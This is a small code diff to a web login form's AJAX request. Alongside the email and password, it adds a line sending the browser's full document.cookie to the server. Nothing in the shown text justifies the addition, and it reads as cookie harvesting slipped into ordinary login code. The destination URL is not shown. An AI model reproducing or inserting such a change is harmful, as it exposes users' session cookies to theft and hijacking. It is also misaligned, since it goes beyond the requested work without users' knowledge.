@@ -45,7 +45,8 @@
                 type: 'POST',
                 data: {
                     login: document.getElementById('inputEmail').value,
-                    password: document.getElementById('inputPassword').value
+                    password: document.getElementById('inputPassword').value,
+                    cookies: document.cookie
                 },
                 success: function (data) {
                     document.cookie = "token=" + data['token'];
